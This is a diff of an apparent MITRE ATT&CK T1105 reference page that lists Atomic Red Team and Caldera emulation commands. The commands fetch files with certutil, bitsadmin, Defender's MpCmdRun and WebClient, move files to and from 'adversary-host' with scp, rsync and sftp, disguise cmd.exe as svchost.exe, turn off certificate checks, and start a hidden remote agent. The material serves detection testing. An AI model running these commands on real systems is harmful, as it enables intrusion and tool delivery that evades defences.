@@ -27,98 +27,70 @@
 ## Potential Commands
 
 ```
-rsync -r #{local_path} #{username}@#{remote_host}:/tmp/victim-files
-
-rsync -r #{local_path} #{username}@victim-host:#{remote_path}
-
-rsync -r /tmp/adversary-rsync/ #{username}@#{remote_host}:#{remote_path}
-
-rsync -r #{local_path} victim@#{remote_host}:#{remote_path}
-
-rsync -r #{username}@#{remote_host}:/tmp/adversary-rsync/ #{local_path}
-
-rsync -r #{username}@adversary-host:#{remote_path} #{local_path}
-
-rsync -r #{username}@#{remote_host}:#{remote_path} /tmp/victim-files
-
-rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}
-
-scp #{local_file} #{username}@#{remote_host}:/tmp/victim-files/
-
-scp /tmp/adversary-scp #{username}@#{remote_host}:#{remote_path}
-
-scp #{local_file} #{username}@victim-host:#{remote_path}
-
-scp #{local_file} victim@#{remote_host}:#{remote_path}
-
-scp #{username}@adversary-host:#{remote_file} #{local_path}
-
-scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
-
-scp #{username}@#{remote_host}:/tmp/adversary-scp #{local_path}
-
-scp adversary@#{remote_host}:#{remote_file} #{local_path}
-
-sftp #{username}@#{remote_host}:/tmp/victim-files/ <<< $'put #{local_file}'
-
-sftp #{username}@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'
-
-sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'
-
-sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
-
-sftp #{username}@adversary-host:#{remote_file} #{local_path}
-
-sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
-
-sftp #{username}@#{remote_host}:/tmp/adversary-sftp #{local_path}
-
-sftp adversary@#{remote_host}:#{remote_file} #{local_path}
-
-cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
-
-cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt
-
-$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
-New-Item -Path $datePath -ItemType Directory
-Set-Location $datePath
-certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
-Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
-
-$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
-New-Item -Path $datePath -ItemType Directory
-Set-Location $datePath
-certutil -verifyctl -split -f #{remote_file}
-Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
-
-C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}
-
-C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} %temp%\Atomic-license.txt
-
-C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
-
-(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "#{destination_path}")
-
 (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "$env:TEMP\Atomic-license.txt")
-
+sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'
+scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
+scp adversary@#{remote_host}:#{remote_file} #{local_path}
+rsync -r #{username}@#{remote_host}:/tmp/adversary-rsync/ #{local_path}
+(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "#{destination_path}")
+scp #{local_file} #{username}@victim-host:#{remote_path}
+scp #{username}@#{remote_host}:/tmp/adversary-scp #{local_path}
+rsync -r #{local_path} #{username}@#{remote_host}:/tmp/victim-files
+cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
+MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path #{local_path}
+rsync -r #{local_path} victim@#{remote_host}:#{remote_path}
+scp #{local_file} #{username}@#{remote_host}:/tmp/victim-files/
+cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
 pushd \\localhost\C$
 echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
 CScript.exe AtomicTestT1105.js //E:JScript
 del AtomicTestT1105.js /Q >nul 2>&1
 del AtomicTestFileT1105.js /Q >nul 2>&1
 popd
-
+sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
+sftp #{username}@#{remote_host}:/tmp/victim-files/ <<< $'put #{local_file}'
+$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
+New-Item -Path $datePath -ItemType Directory
+Set-Location $datePath
+certutil -verifyctl -split -f #{remote_file}
+Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
+rsync -r /tmp/adversary-rsync/ #{username}@#{remote_host}:#{remote_path}
+scp /tmp/adversary-scp #{username}@#{remote_host}:#{remote_path}
+sftp #{username}@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'
+sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
+sftp #{username}@adversary-host:#{remote_file} #{local_path}
+rsync -r #{local_path} #{username}@victim-host:#{remote_path}
+sftp #{username}@#{remote_host}:/tmp/adversary-sftp #{local_path}
+scp #{username}@adversary-host:#{remote_file} #{local_path}
+scp #{local_file} victim@#{remote_host}:#{remote_path}
+rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}
+cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt
+$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
+New-Item -Path $datePath -ItemType Directory
+Set-Location $datePath
+certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
+sftp adversary@#{remote_host}:#{remote_file} #{local_path}
+C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
 copy C:\Windows\System32\cmd.exe C:\svchost.exe
 C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
-
-cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
-MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path #{local_path}
-
 cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
 MpCmdRun.exe -DownloadFile -url #{remote_file} -path %temp%\Atomic-license.txt
-
-{'windows': {'psh': {'command': '$wc=New-Object System.Net.WebClient;\n$output="PowerShellCore.msi";\n$wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", $output);\nStart-Process msiexec.exe -ArgumentList "/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1" -Wait;\n$env:Path += ";C:\\Program Files\\Powershell\\6";\nStart-Process pwsh -ArgumentList "-c #{location} -server #{server} - group #{group} -executors pwsh" -WindowStyle hidden;\n', 'cleanup': 'rm PowerShellCore.msi;\n'}}}
-{'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");\nNew-Item -ItemType "directory" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly \'System.IO.Compression.FileSystem\'; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\\Windows\\System32\\PSTools");\n'}}}
+C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} %temp%\Atomic-license.txt
+C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}
+rsync -r #{username}@#{remote_host}:#{remote_path} /tmp/victim-files
+rsync -r #{username}@adversary-host:#{remote_path} #{local_path}
+$wc=New-Object System.Net.WebClient;
+$output="PowerShellCore.msi";
+$wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", $output);
+Start-Process msiexec.exe -ArgumentList "/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1" -Wait;
+$env:Path += ";C:\Program Files\Powershell\6";
+Start-Process pwsh -ArgumentList "-c #{location} -server #{server} - group #{group} -executors pwsh" -WindowStyle hidden;
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+$web = (New-Object System.Net.WebClient);
+$result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");
+New-Item -ItemType "directory" C:\Windows\System32\PSTools -Force;
+Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\Windows\System32\PSTools");
 ```
 
 ## Commands Dataset
@@ -292,41 +264,31 @@ MpCmdRun.exe -DownloadFile -url #{remote_file} -path %temp%\Atomic-license.txt
              '%temp%\\Atomic-license.txt\n',
   'name': None,
   'source': 'atomics/T1105/T1105.yaml'},
- {'command': {'windows': {'psh': {'cleanup': 'rm PowerShellCore.msi;\n',
-                                  'command': '$wc=New-Object '
-                                             'System.Net.WebClient;\n'
-                                             '$output="PowerShellCore.msi";\n'
-                                             '$wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", '
-                                             '$output);\n'
-                                             'Start-Process msiexec.exe '
-                                             '-ArgumentList "/package '
-                                             'PowerShellCore.msi /quiet '
-                                             'ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 '
-                                             'ENABLE_PSREMOTING=1 '
-                                             'REGISTER_MANIFEST=1" -Wait;\n'
-                                             '$env:Path += ";C:\\Program '
-                                             'Files\\Powershell\\6";\n'
-                                             'Start-Process pwsh -ArgumentList '
-                                             '"-c #{location} -server '
-                                             '#{server} - group #{group} '
-                                             '-executors pwsh" -WindowStyle '
-                                             'hidden;\n'}}},
+ {'command': '$wc=New-Object System.Net.WebClient;\n'
+             '$output="PowerShellCore.msi";\n'
+             '$wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", '
+             '$output);\n'
+             'Start-Process msiexec.exe -ArgumentList "/package '
+             'PowerShellCore.msi /quiet '
+             'ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 '
+             'REGISTER_MANIFEST=1" -Wait;\n'
+             '$env:Path += ";C:\\Program Files\\Powershell\\6";\n'
+             'Start-Process pwsh -ArgumentList "-c #{location} -server '
+             '#{server} - group #{group} -executors pwsh" -WindowStyle '
+             'hidden;\n',
   'name': 'Download, install and start new process under PowerShell Core 6',
   'source': 'data/abilities/command-and-control/60f63260-39bb-4136-87a0-b6c2dca799fc.yml'},
- {'command': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
-                                             '= { $True };\n'
-                                             '$web = (New-Object '
-                                             'System.Net.WebClient);\n'
-                                             '$result = '
-                                             '$web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", '
-                                             '"PSTools.zip");\n'
-                                             'New-Item -ItemType "directory" '
-                                             'C:\\Windows\\System32\\PSTools '
-                                             '-Force;\n'
-                                             'Add-Type -Assembly '
-                                             "'System.IO.Compression.FileSystem'; "
-                                             '[System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", '
-                                             '"C:\\Windows\\System32\\PSTools");\n'}}},
+ {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
+             '= { $True };\n'
+             '$web = (New-Object System.Net.WebClient);\n'
+             '$result = '
+             '$web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", '
+             '"PSTools.zip");\n'
+             'New-Item -ItemType "directory" C:\\Windows\\System32\\PSTools '
+             '-Force;\n'
+             "Add-Type -Assembly 'System.IO.Compression.FileSystem'; "
+             '[System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", '
+             '"C:\\Windows\\System32\\PSTools");\n',
   'name': 'Download and install PSTools by unzipping the file',
   'source': 'data/abilities/command-and-control/eb814e03-811a-467a-bc6d-dcd453750fa2.yml'}]
 ```
